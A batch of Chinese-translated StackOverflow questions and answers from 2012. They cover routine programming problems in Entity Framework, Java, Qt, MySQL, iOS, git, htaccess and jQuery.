# StackOverflow 问答 10347000-10347999

# entity-framework-4.1 - 实体框架代码先双一对一关系

> ID：10347019
> 
> 赞同：0
> 
> 时间：2012-04-27T08:05:00.640
> 
> 标签：entity-framework-4.1, ef-code-first, navigation-properties

```
class Event{  
    int? EventID{get;set;}  
    int? FirstParticipantID{get;set;}  
    Participant FirstParticipant{get;set;}  
    int? SecondParticipantID{get;set;}  
    Participant SecondParticipant{get;set;}  
    int? CreatedByID{get;set;}  
    User CreatedBy{get;set;}  
}

class Participant{  
    int? ParticipantID{get;set;}  
    List<Event> Events{get;set;}  
    int? CreatedByID{get;set;}  
    User CreatedBy{get;set;}  
}

protected override void OnModelCreating(DbModelBuilder modelBuilder){  
    modelBuilder.Entity<Event>().HasRequired(m => m.FirstParticipant).WithMany(m => m.Events).HasForeignKey(m => m.FirstParticipantID);  
    modelBuilder.Entity<Event>().HasRequired(m => m.SecondParticipant).WithMany(m => m.Events).HasForeignKey(m => m.SecondParticipantID);  
    modelBuilder.Entity<Event>().HasRequired(m => m.CreatedBy);  
    modelBuilder.Entity<Participant>().HasRequired(m => m.CreatedBy);  
} 
```

这对我来说似乎很清楚，但 EF（和 sql）一直在抱怨，无论我对 hasmanny/hasrequired 的东西采取什么行动。我什至找不到谷歌帮助，因为我不知道我要实现的名称（一对一？？？！！！）

这个想法是一个事件必须有 2 个不为空的参与者（只有第一个和第二个，不多），并且每个参与者可能有很多事件

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T08:16:25.753

您的代码中有多个问题：

*   PK 不能为空
*   如果要将关系定义为必需，则 FK 不能为空
*   当您定义两个关系时，`Participant`您需要两个导航属性 - 您不能将两个关系映射到单个`Events`属性
*   你没有完成你的`CreatedBy`映射`Event``Participant`

试试这个：

```
public class Event{  
    public int EventID {get;set;}  
    public int FirstParticipantID{get;set;}  
    public Participant FirstParticipant{get;set;}  
    public int SecondParticipantID{get;set;}  
    public Participant SecondParticipant{get;set;}  
    public int CreatedByID{get;set;}  
    public User CreatedBy{get;set;}  
}

public class Participant{  
    public int ParticipantID {get;set;}   
    public int CreatedByID {get;set;}  
    public User CreatedBy {get;set;}  
    public ICollection<Event> FristEvents { get; set; }
    public ICollection<Event> SecondEvents { get; set; }
}

protected override void OnModelCreating(DbModelBuilder modelBuilder){  
    modelBuilder.Entity<Event>()
                .HasRequired(m => m.FirstParticipant)
                .WithMany(m => m.FirstEvents)
                .HasForeignKey(m => m.FirstParticipantID);  
    modelBuilder.Entity<Event>()
                .HasRequired(m => m.SecondParticipant)
                .WithMany(m => m.SecondEvents)
                .HasForeignKey(m => m.SecondParticipantID);  
    modelBuilder.Entity<Event>()
                .HasRequired(m => m.CreatedBy)
                .WithMany()
                .HasForeignKey(m => m.CreatedByID);
    modelBuilder.Entity<Participant>()
                .HasRequired(m => m.CreatedBy)
                .WithMany()
                .HasForeignKey(m => m.CreatedByID);  
} 
```

# java - 如何从 JAVA 程序向终端发送非命令数据？

> ID：10347023
> 
> 赞同：0
> 
> 时间：2012-04-27T08:05:43.787
> 
> 标签：java, terminal, command, send

> **可能重复：**
> [如何在不将其作为标准命令的情况下将字符串发送到终端？](https://stackoverflow.com/questions/10315880/how-to-send-a-string-to-the-terminal-without-having-it-to-be-a-standard-command)

我已经发布了一个关于这个主题的问题，但是过了一会儿，我的问题仍然没有解决。Marko Topolnik 向我展示了一些可能的答案，但我仍然被阻止。

这是我的问题：

我有一个 Java 程序，在某些时候需要连接到外部程序。为此，我实现了以下功能：

```
public void login(String password) throws IOException
{
    final Process p = Runtime.getRuntime().exec("p4 login");
    final BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
    System.out.println("going to read line");

    System.out.println(in.read());
    System.out.println("read line");
    new PrintWriter(p.getOutputStream(),true).println(password);
    System.out.println("password sent");
    String line;
    while ((line = in.readLine()) != null)      
    {      
        System.out.println("printing line");
        System.out.println(in.read());
        System.out.println(line);
        System.out.println("printed line");
        if (line.startsWith("User")) loggedIn=true;
    }        
    loggedIn=false;
} 
```

该函数成功向终端发送“p4 login”。此时终端的响应是：“输入密码：”

然后，我尝试将密码发送到终端，但我找不到这样做的方法。我曾尝试使用与第一次相同的命令，但 exec 命令只能发送标准命令。

这是我[第一篇文章](https://stackoverflow.com/questions/10315880/how-to-send-a-string-to-the-terminal-without-having-it-to-be-a-standard-command)的问题：我使用 exec() 命令发送密码，这就是我尝试使用的原因

```
new PrintWriter(p.getOutputStream()).println(password); 
```

System.out.println(s); 在我的功能中始终显示“输入密码：”，这不是我想要的。

我已经尝试刷新输出，这是在我的旧帖子中向我建议的，在发送的第一个命令和第二个命令之间等待一段时间，但仍然没有。

如果有人知道我怎么能做这样的事情，那就太好了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T08:27:46.543

这段代码将永远循环，但它会打印出程序发送给您的任何内容：

```
public boolean login(String password) throws Exception {
  final Process p = Runtime.getRuntime().exec("p4 login");
  final BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
  final char[] buf = new char[20];
  System.out.println(new String(buf, 0, in.read(buf)));
  System.out.println("Sending password");
  new PrintWriter(p.getOutputStream(),true).println(password);
  System.out.println("Password sent");
  int read;
  while ((read = in.read(buf)) != -1) {
    System.out.print(new String(buf, 0, read));
    System.out.flush();
  }
  return false;
} 
```

# java - 使用 PDFBox 进行缩放

> ID：10347027
> 
> 赞同：2
> 
> 时间：2012-04-27T08:06:01.540
> 
> 标签：java, swing, pdfbox

PDFBox 是否支持某种缩放功能？我目前正在将页面输出到图像，但这很慢，尤其是在必须调整文档大小时。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T09:44:28.783

```
PDPageXYZDestination dest = new PDPageXYZDestination();    
dest.setPageNumber(0);    
dest.setZoom(1);    
dest.setTop(new Float(PDPage.PAGE_SIZE_A4.getHeight()).intValue());    
PDActionGoTo action = new PDActionGoTo();    
action.setDestination(dest);    
doc.getDocumentCatalog().setOpenAction(action); 
```

# apache - Apache Geronimo 未在 Eclipse 中安装

> ID：10347030
> 
> 赞同：1
> 
> 时间：2012-04-27T08:06:14.383
> 
> 标签：apache, geronimo

我在我的 Windows 机器上安装了 Apache Geronimo Server 并从 启动它`Windows->Preferences->Server->Run-time`，但之后我尝试添加新服务器并收到以下错误：

```
Booting Geronimo Kernel (in Java 1.7.0_03)...
Module  1/62 org.apache.geronimo.framework/j2ee-security/2.1/car                13:22:28,738 WARN  [1/car,j2eeType=GBean,name=JMXService] Failure in JMXConnector service:jmx:rmi://0.0.0.0:9999/jndi/rmi://0.0.0.0:1099/JMXConnector
13:22:28,739 ERROR [GBeanInstanceState] Error while starting; GBean is now in the FAILED state: abstractName="org.apache.geronimo.framework/j2ee-security/2.1/car?ServiceModule=org.apache.geronimo.framework/j2ee-security/2.1/car,j2eeType=GBean,name=JMXService"
java.rmi.server.ExportException: Port already in use: 9999; nested exception is: 
    java.net.BindException: Address already in use: JVM_Bind
    at sun.rmi.transport.tcp.TCPTransport.listen(Unknown Source)
    at sun.rmi.transport.tcp.TCPTransport.exportObject(Unknown Source)
    at sun.rmi.transport.tcp.TCPEndpoint.exportObject(Unknown Source)
    at sun.rmi.transport.LiveRef.exportObject(Unknown Source)
    at sun.rmi.server.UnicastServerRef.exportObject(Unknown Source)
    at java.rmi.server.UnicastRemoteObject.exportObject(Unknown Source)
    at java.rmi.server.UnicastRemoteObject.exportObject(Unknown Source)
    at javax.management.remote.rmi.RMIJRMPServerImpl.export(Unknown Source)
    at javax.management.remote.rmi.RMIJRMPServerImpl.export(Unknown Source)
    at javax.management.remote.rmi.RMIConnectorServer.start(Unknown Source)
    at org.apache.geronimo.jmxremoting.JMXConnector.doStart(JMXConnector.java:191)
    at org.apache.geronimo.gbean.runtime.GBeanInstance.createInstance(GBeanInstance.java:998)
    at org.apache.geronimo.gbean.runtime.GBeanInstanceState.attemptFullStart(GBeanInstanceState.java:268)
    at org.apache.geronimo.gbean.runtime.GBeanInstanceState.start(GBeanInstanceState.java:102)
    at org.apache.geronimo.gbean.runtime.GBeanInstanceState.startRecursive(GBeanInstanceState.java:124)
    at org.apache.geronimo.gbean.runtime.GBeanInstance.startRecursive(GBeanInstance.java:555)
    at org.apache.geronimo.kernel.basic.BasicKernel.startRecursiveGBean(BasicKernel.java:379)
    at org.apache.geronimo.kernel.config.ConfigurationUtil.startConfigurationGBeans(ConfigurationUtil.java:456)
    at org.apache.geronimo.kernel.config.KernelConfigurationManager.start(KernelConfigurationManager.java:187)
    at org.apache.geronimo.kernel.config.SimpleConfigurationManager.startConfiguration(SimpleConfigurationManager.java:534)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
    at java.lang.reflect.Method.invoke(Unknown Source)
    at org.apache.geronimo.gbean.runtime.ReflectionMethodInvoker.invoke(ReflectionMethodInvoker.java:34)
    at org.apache.geronimo.gbean.runtime.GBeanOperation.invoke(GBeanOperation.java:124)
    at org.apache.geronimo.gbean.runtime.GBeanInstance.invoke(GBeanInstance.java:832)
    at org.apache.geronimo.gbean.runtime.RawInvoker.invoke(RawInvoker.java:57)
    at org.apache.geronimo.kernel.basic.RawOperationInvoker.invoke(RawOperationInvoker.java:35)
    at org.apache.geronimo.kernel.basic.ProxyMethodInterceptor.intercept(ProxyMethodInterceptor.java:96)
    at org.apache.geronimo.gbean.GBeanLifecycle$$EnhancerByCGLIB$$458b9f94.startConfiguration(<generated>)
    at org.apache.geronimo.system.main.EmbeddedDaemon.doStartup(EmbeddedDaemon.java:156)
    at org.apache.geronimo.system.main.EmbeddedDaemon.execute(EmbeddedDaemon.java:78)
    at org.apache.geronimo.kernel.util.MainConfigurationBootstrapper.main(MainConfigurationBootstrapper.java:45)
    at org.apache.geronimo.cli.AbstractCLI.executeMain(AbstractCLI.java:67)
    at org.apache.geronimo.cli.daemon.DaemonCLI.main(DaemonCLI.java:30)
Caused by: java.net.BindException: Address already in use: JVM_Bind
    at java.net.DualStackPlainSocketImpl.bind0(Native Method)
    at java.net.DualStackPlainSocketImpl.socketBind(Unknown Source)
    at java.net.AbstractPlainSocketImpl.bind(Unknown Source)
    at java.net.PlainSocketImpl.bind(Unknown Source)
    at java.net.ServerSocket.bind(Unknown Source)
    at java.net.ServerSocket.<init>(Unknown Source)
    at java.net.ServerSocket.<init>(Unknown Source)
    at sun.rmi.transport.proxy.RMIDirectSocketFactory.createServerSocket(Unknown Source)
    at sun.rmi.transport.proxy.RMIMasterSocketFactory.createServerSocket(Unknown Source)
    at sun.rmi.transport.tcp.TCPEndpoint.newServerSocket(Unknown Source)
    ... 36 more
Server Startup failed

org.apache.geronimo.kernel.config.LifecycleException: start of org.apache.geronimo.framework/j2ee-security/2.1/car failed
    at org.apache.geronimo.kernel.config.SimpleConfigurationManager.startConfiguration(SimpleConfigurationManager.java:551)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
    at java.lang.reflect.Method.invoke(Unknown Source)
    at org.apache.geronimo.gbean.runtime.ReflectionMethodInvoker.invoke(ReflectionMethodInvoker.java:34)
    at org.apache.geronimo.gbean.runtime.GBeanOperation.invoke(GBeanOperation.java:124)
    at org.apache.geronimo.gbean.runtime.GBeanInstance.invoke(GBeanInstance.java:832)
    at org.apache.geronimo.gbean.runtime.RawInvoker.invoke(RawInvoker.java:57)
    at org.apache.geronimo.kernel.basic.RawOperationInvoker.invoke(RawOperationInvoker.java:35)
    at org.apache.geronimo.kernel.basic.ProxyMethodInterceptor.intercept(ProxyMethodInterceptor.java:96)
    at org.apache.geronimo.gbean.GBeanLifecycle$$EnhancerByCGLIB$$458b9f94.startConfiguration(<generated>)
    at org.apache.geronimo.system.main.EmbeddedDaemon.doStartup(EmbeddedDaemon.java:156)
    at org.apache.geronimo.system.main.EmbeddedDaemon.execute(EmbeddedDaemon.java:78)
    at org.apache.geronimo.kernel.util.MainConfigurationBootstrapper.main(MainConfigurationBootstrapper.java:45)
    at org.apache.geronimo.cli.AbstractCLI.executeMain(AbstractCLI.java:67)
    at org.apache.geronimo.cli.daemon.DaemonCLI.main(DaemonCLI.java:30)
Caused by: org.apache.geronimo.kernel.config.InvalidConfigException: Unknown start exception
    at org.apache.geronimo.kernel.config.ConfigurationUtil.startConfigurationGBeans(ConfigurationUtil.java:522)
    at org.apache.geronimo.kernel.config.KernelConfigurationManager.start(KernelConfigurationManager.java:187)
    at org.apache.geronimo.kernel.config.SimpleConfigurationManager.startConfiguration(SimpleConfigurationManager.java:534)
    ... 16 more
Caused by: org.apache.geronimo.gbean.InvalidConfigurationException: Configuration org.apache.geronimo.framework/j2ee-security/2.1/car failed to start due to the following reasons:
  The service ServiceModule=org.apache.geronimo.framework/j2ee-security/2.1/car,j2eeType=GBean,name=JMXService did not start because Port already in use: 9999; nested exception is: 
    java.net.BindException: Address already in use: JVM_Bind

    at org.apache.geronimo.kernel.config.ConfigurationUtil.startConfigurationGBeans(ConfigurationUtil.java:485)
    ... 18 more 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-28T06:17:04.563

***您发布的那个长***堆栈跟踪中多次列出了根错误。服务器正在尝试绑定到已在使用的端口（端口 9999）。您需要在运行 Geronimo 服务器之前找出哪个进程正在使用相关端口并停止它。

您可以使用该`netstat`命令来查找持有特定端口的进程：

```
netstat -ano 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-13T02:37:35.967

感知的答案+1。

我想为此添加一些东西...

当我遇到“端口已在使用：xxxx”时，重新启动当前正在使用的 Eclipse 会话并尝试再次运行通常可以帮助我摆脱它。

# c++ - Qt 无法将 QPaintDevice 转换为 QImage

> ID：10347032
> 
> 赞同：0
> 
> 时间：2012-04-27T08:06:17.967
> 
> 标签：c++, qt, qpainter, qimage

这听起来很傻，但我无法截取 QwebView 的屏幕截图。

```
QImage image(view.page()->viewportSize(), QImage::Format_ARGB32);
QPainter painter;
painter.begin(image); // Here is the error. See below
view.page()->mainFrame()->render(&painter);
painter.end();
image.save("out.png"); 
```

错误消息是，

```
mainwindow.cpp:115: error: no matching function for call to 'QPainter::begin(QImage&)'
candidate is bool QPainter::begin(QPaintDevice*) 
```

我所知道的是，QPaintDevice 是 QPaint 的基础。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-27T08:16:28.047

从需要`image`通过指针传递的错误来看：

```
painter.begin(&image); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-27T08:17:52.527

错误消息告诉您：该方法`begin`需要指向绘图表面的指针，而不是引用。尝试做：

```
painter.begin(&image); 
```

# mysql - 如何选择 mycolumn 为整数值的所有行？

> ID：10347033
> 
> 赞同：4
> 
> 时间：2012-04-27T08:06:20.157
> 
> 标签：mysql, sql

从列是无符号整数的表中选择所有行的好方法是什么，例如这里是一些伪sql

```
SELECT * FROM mytable WHERE mycolumn IS UNSIGNED INTEGER 
```

因此，字符串 'abc' 和像 '12.3' 和 '12.0' 这样的数字**不会**匹配，但像 '123' 这样的整数会匹配。

mycolumn 是 text/varchar 类型

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-27T08:24:27.457

```
SELECT * FROM mytable WHERE mycolumn REGEXP '^[0-9]+$' 
```

这还不够简单吗？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-27T08:14:53.757

```
select * from mytable  
where cast(mycolumn as int) = mycolumn 
```

[更新示例](http://sqlfiddle.com/#!2/95be9/1)

## 编辑

我没看到你有`varchar`专栏。试试这个：

```
select * from myTable 
where cast(cast(myColumn as decimal(8,2)) as signed) = 
      cast(myColumn as decimal(8,2)) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T08:08:47.147

```
SELECT * FROM mytable WHERE mycolumn = FLOOR(mycolumn) 
```

//编辑：好的，由于指定了问题，这个答案不再适合。它将拒绝 12.3 但匹配 12 AND 12.0 （结果证明没有缩进）。

修改后的问题无法用数学方法解决，唯一的方法是匹配字符，就像 Robin Castlin 所做的那样。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-27T08:50:52.230

```
create table test_int(
test_value varchar(5)
)

insert into test_int values('a')
insert into test_int values('1')
insert into test_int values('12.3')

select *
from test_int 
where isnumeric(
cast(test_value as varchar)) = 1 
```

结果

```
1
12.3 
```

# iphone - 程序收到信号 SIGABRT (xcode)

> ID：10347038
> 
> 赞同：-4
> 
> 时间：2012-04-27T08:06:50.540
> 
> 标签：iphone, objective-c, ios4

```
#import <UIKit/UIKit.h>

@interface tableview : UIViewController<UITableViewDataSource>

{
    NSArray *listOfItems;
}
@property(nonatomic,retain) NSArray *listOfItems;

@end

#import "tableview.h"

@implementation tableview
@synthesize listOfItems;

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath 
{
    static NSString *CellIdentifier = @"Cell";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

    if (cell == nil) 
    {
        cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier ]autorelease];
    }

    //NSString *cellValue = [listOfItems objectAtIndex:indexPath.row];
    cell.textLabel.text = [listOfItems objectAtIndex:indexPath.row];
    return cell;
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    return 3;
}

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        // Custom initialization
    }
    return self;
}

- (void)didReceiveMemoryWarning
{
    // Releases the view if it doesn't have a superview.
    [super didReceiveMemoryWarning];

    // Release any cached data, images, etc that aren't in use.
}

#pragma mark - View lifecycle

- (void)viewDidLoad
{
    listOfItems = [[NSArray alloc] initWithObjects:@"first",@"second",@"third", nil];

    //listOfItems = [[NSMutableArray alloc]init];
   // [listOfItems addObject:@"first"];
    //[listOfItems addObject:@"second"];
    [super viewDidLoad];
    // Do any additional setup after loading the view from its nib.
}

-(void)dealloc
{
    [listOfItems release];
    [super dealloc];
}

@end 
```

> 2012-04-27 13:33:23.276 tableview 测试[438:207]-[UIView tableView:numberOfRowsInSection:]：无法识别的选择器发送到实例 0x6855500
> 2012-04-27 13:33:23.362 tableview 测试[438:207] ***由于未捕获的异常“NSInvalidArgumentException”而终止应用程序，原因：
> “-[UIView tableView:numberOfRowsInSection:]：无法识别的选择器
> 发送到实例 0x6855500”
> ***第一次抛出调用堆栈：
> (0x13bb052 0x154cd0a 0x13bcced 0x1321f00 0x1321ce2 0x1ecf2b 0x1ef722 0x9f7c7 0x9f2c1 0xa228c 0xa6783 0x51322 0x13bce72 0x1d6592d 0x1d6f827 0x1cf5fa7 0x1cf7ea6 0x1d8330c 0x23530 0x138f9ce 0x1326670 0x12f24f6 0x12f1db4 0x12f1ccb 0x12a4879 0x12a493e 0x12a9b 0x2282 0x21f5) terminate called throwing an exceptionCurrent language: auto; 目前是objective-c (gdb)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T10:43:42.013

我想你错过了`UITableViewDelegate`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T05:43:41.327

@interface 表视图：UIViewController....

而不是 UIViewController 尝试使用 UIView

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-04-27T14:51:36.340

您的代码现在不完整。您的“tableView”不是真正的 UITableView，它是 UIViewController！

您应该在 h 文件和 xib 文件中有 UITableView 实例，然后将它们相互链接，并将 UITableViewDelegate 属性设置为您的 UIViewcontroller 类。

请查看基本的 UITableView（或 UITableViewController）示例...

# java - Jubula 无法启动我的应用程序

> ID：10347039
> 
> 赞同：1
> 
> 时间：2012-04-27T08:07:03.493
> 
> 标签：java, gui-testing, jubula

我正在评估各种 GUI 测试框架。

我从 Jubula 开始，基本上遵循以下教程：http://jmhofer.johoop.de/?p=132，[但](http://jmhofer.johoop.de/?p=132)将其应用于我们的应用程序。

我有一个启动应用程序的批处理文件，但我无法通过 Jubula 启动它。

如此处所述[http://jmhofer.johoop.de/?p=163](http://jmhofer.johoop.de/?p=163)我启动 AUT 代理并连接到它，但是当我尝试通过“启动 AUT”启动应用程序时没有任何反应。Jubula 控制台中没有任何内容，“启动 AUT 代理”窗口中没有任何内容。

这可能是什么原因？我在哪里可以找到更多信息 出了什么问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T09:21:29.450

问题似乎是我总是点击运行按钮（多么愚蠢的想法）。

您实际上必须使用按钮的下拉部分来选择您的 AUT 至少一次。

# android - 安装 3.5.1 ActionBarSherlock 的问题

> ID：10347042
> 
> 赞同：0
> 
> 时间：2012-04-27T08:07:32.990
> 
> 标签：android, android-actionbar, actionbarsherlock

安装 3.5.1 ActionBarSherlock 时遇到问题

我使用 JakeWharton-ActionBarSherlock-3.5.1-0-gc359e93 但在 Eclipse 中有更多（>100）错误。

在这里你可以查看我的步骤..

[http://www.youtube.com/watch?feature=player_detailpage&v=0XeKh_8zuGE](http://www.youtube.com/watch?feature=player_detailpage&v=0XeKh_8zuGE)

需要帮忙..

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T08:26:22.117

ActionBarSherlock 3.5.x 需要这些东西：

1.  使用 Android 3.2 编译库和您的项目
2.  使用 Java 1.6 (6) 合规性进行编译。在 Eclipse 中，可以在项目的“Java 编译器”设置下找到它。
3.  在 API 级别 11 或更高级别的清单中指定 a `targetSdkVersion`。

但是，您应该升级到[最新的 ActionBarSherlock](http://actionbarsherlock.com/download.html)，因为不再支持 3.x 版。

# git - 删除（空）git Remote

> ID：10347050
> 
> 赞同：5
> 
> 时间：2012-04-27T08:08:21.180
> 
> 标签：git, git-remote

```
$ git remote -v
(null)  git@github.com:username/Savvy.git (fetch)
(null)  git@github.com:username/Savvy.git (push)
origin  git@github.com:username/SavvyCode.git (fetch)
origin  git@github.com:username/SavvyCode.git (push) 
```

我们如何删除上面的*（空）*遥控器？谢谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-27T08:17:29.940

查看`.git/config`文件（“.git”是项目目录中的子目录）。这是一个 INI 样式的文件，其中包含每个遥控器的一个部分，如下所示：

```
[remote "origin"]
    fetch = +refs/heads/*:refs/remotes/origin/*
    url = <REPOSITORY_URL> 
```

所以寻找看起来很奇怪的遥控器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-08-09T20:43:31.383

或者您可以使用 CLI 并通过执行以下命令将其删除：

```
git remote rm "(null)" 
```

# python - lxml - 返回清理对象的函数，而不仅仅是一个字符串

> ID：10347054
> 
> 赞同：-2
> 
> 时间：2012-04-27T08:08:41.403
> 
> 标签：python, xml, django, lxml

这是一些代码：

```
from lxml import etree
url = 'http://www.google.com/ig/api?stock=aapl'
data = etree.parse(url) 
root = data.getroot()
finance = root[0]

def clean(var, num):
    var = str(finance[num].attrib).split("'")[-2]
    print var 
```

我想将变量作为我以后可以调用的对象返回。

我知道问题是什么 - str() - 但不知道如何解决它，因为直接使用变量不允许我进行必要的`.attrib`操作`.split`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:29:19.073

假设您想从 XML 收集信息，请执行以下操作：

```
data = dict()
for elem in finance:
    data[elem.tag] = elem.attrib['data'] 
```

`data`您将在变量中获得字典，例如：

```
{'symbol': 'AAPL', 'company': 'Apple Inc.', 'currency': 'USD', 'volume': '19145182' ... } 
```

您将能够访问特定的信息：

```
print data['company'] 
```

# sql-server - 同一存储过程的时间成本差异巨大

> ID：10347061
> 
> 赞同：1
> 
> 时间：2012-04-27T08:09:10.400
> 
> 标签：sql-server, database, sql-server-2008, stored-procedures

我正在使用 SQL Server 2008 R2。

**过程其实是这样的：**

> 首先，从远程服务器中提取大约**200 万条记录，**
> 
> 然后在本地完成连接，
> 
> 最终结果是**数千条记录**。

时间成本从不到 1 分钟到 30 分钟不等。

而在我经历了 30 分钟的延迟之后，接下来的时间成本似乎都只有 3 分钟左右。

它是**相同**的数据，**相同**的SP。

什么会导致这种巨大的差异？

## 更新

我删除SP，重新启动SQL server服务，重新创建SP。执行只用了50秒！

怎么了？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T08:24:47.100

您描述的行为似乎很极端 - 但是（如果您排除客户端），有 3 个合乎逻辑的地方可以查看。

首先是数据库服务器上的查询执行。值得使用查询分析器工具来查看它是否使用任何索引 - 到目前为止，数据库查询性能可变的最常见原因是查询没有使用（正确的）索引，因此查询缓存的影响发挥了作用很大一部分。SQL Server 将缓存大量数据，并且您的 proc 的第一次运行会填充该缓存；第二次运行速度更快，因为它会命中缓存。一段时间后，缓存变得陈旧，运行过程再次变慢。

第二种可能性是数据库服务器不稳定——它可能不够强大，无法完成它应该完成的所有工作。在那种情况下，有一天你很幸运，拥有所有的服务器资源；接下来，其他人正在运行查询，而您的查询速度变慢。这会使所有查询变慢，而不仅仅是这个——所以听起来不太可能。

第三种可能性是网络怪异——正如菲尔所说，“数千条记录”并没有什么可怕的，但如果它们很大，并且你的网络中充斥着小猫的照片，它*可能会*产生影响。同样，这将表现为一般的网络缓慢，并且不太可能解释 30 分钟的延迟......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T10:33:39.217

第四，有什么事情同时发生吗？

五、你的SP是否使用动态生成的SQL语句？这将导致 SP 无法预编译。如果可能的话，将这些语句分成子 SP。

# .htaccess - （虚拟）子文件夹中的 htaccess 镜像根目录

> ID：10347064
> 
> 赞同：0
> 
> 时间：2012-04-27T08:09:17.753
> 
> 标签：.htaccess, dns

首先：我确实看过之前关于 SO 的答案，但似乎没有人问我需要什么！

我的网站有一个必须继续正常工作的根文件夹。

但是我需要将对子文件夹 www.domain.com/subfolder/ 的请求重定向到根文件夹 www.domain.com

回顾：

> 浏览器请求 ROOT 文件夹 ---> 获取 ROOT 文件夹 [像任何普通网站一样]
> 
> 示例：www.domain.com/ PULLS ---> www.domain.com/
> 
> 浏览器请求 SUBfolder ---> 获取 ROOT 文件夹 [通过 htaccess]
> 
> 示例：www.domain.com/subfolder/ PULLS ---->www.domain.com/

这意味着根文件夹应该继续正常工作，并且必须在给定子文件夹中对根文件夹进行某种镜像。

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T17:59:26.237

我看不出这个有什么用，但没关系。

```
RewriteRule ^SUBfolder/(.*)$ /$1 [L] 
```

**编辑：**要添加 mobile_version 获取参数，按照评论中的要求使用：

```
RewriteRule ^SUBfolder/(.*)$ /$1?mobile_version=true [L,QSA] 
```

# javascript - 选择文本区域时如何停止运行键码 37 和 39

> ID：10347071
> 
> 赞同：-1
> 
> 时间：2012-04-27T08:09:55.690
> 
> 标签：javascript, jquery

简单地说，我有一个 js 脚本，可以用左右箭头更改页面，但是如果选择了特定的 textarea，如何停止呢？

这是我改变页面的js

```
$(document).keydown(function(event) {

    if(event.keyCode === 37) {
          window.location = "http://site.com/pics/5";
    }    
    else if(event.keyCode === 39) {
          window.location = "http://site.com/pics/7";
    }
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T08:17:09.727

```
$('textarea').on('keypress', function(evt) {
  if ((evt.keyCode === 37) || (evt.keyCode === 39)) {
     console.log('stop propagation');
     evt.stopPropagation();
  }
}); 
```

参见示例小提琴：http: [//jsfiddle.net/GUDqV/1](http://jsfiddle.net/GUDqV/1)

更新：在 OP 澄清之后，这甚至适用于 Chrome 上的 jQuery 1.2.6：http: [//jsfiddle.net/GUDqV/2/](http://jsfiddle.net/GUDqV/2/)

```
$('textarea').bind('keyup', function(evt) {
  if ((evt.keyCode === 37) || (evt.keyCode === 39)) {
     console.log('stop propagation');
     evt.stopPropagation();
  } 
});​ 
```

在 Chrome 和 jQ1.2.6 上查看此代码的屏幕截图![Chrome 和 jQ1.2.6 上的最新代码](../Images/7e5995e21e0f0096dc8ad601f02179e3.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T08:13:18.890

您可以通过执行以下操作来检查 textarea 是否处于焦点：

```
if (document.activeElement == myTextArea) {
  // Don't change the page
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T08:17:05.850

`$("#mytextarea").is(":focus")`这会让你知道元素是否聚焦。也`$(document.activeElement)`将获得当前聚焦的元素。您可以检查您的文本区域是否聚焦，并禁用使用左右箭头键时导航的脚本。显示您尝试过的内容的一点代码可能会带来更具体的响应。希望这可以帮助。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-27T10:47:13.353

可能最简单的方法是考虑`event.target`到您的代码，检查它是否是文本区域：

```
$(document).keydown(function(event) {
    if (event.target.id == "myTextArea") {
        return true;
    }
    else if(event.keyCode === 37) {
        window.location = "http://site.com/pics/5";
    }    
    else if(event.keyCode === 39) {
        window.location = "http://site.com/pics/7";
    }
}); 
```

任何源自`textarea`id 为*myTextArea*的元素的键事件都将被忽略。

# oop - 信号和槽

> ID：10347076
> 
> 赞同：0
> 
> 时间：2012-04-27T08:10:11.257
> 
> 标签：oop

信号是在类声明中声明的特殊成员函数。它可以有参数列表但没有函数体。它不能被调用，但可以由类的实例发出。

插槽是一种特殊的 void 成员函数，可以连接到信号。然后当信号发出时，槽被调用。插槽也可以作为普通成员函数调用。

信号和槽可以跨不同类的对象工作吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T09:17:43.600

它们确实可以跨不同类的对象工作，这就是重点。

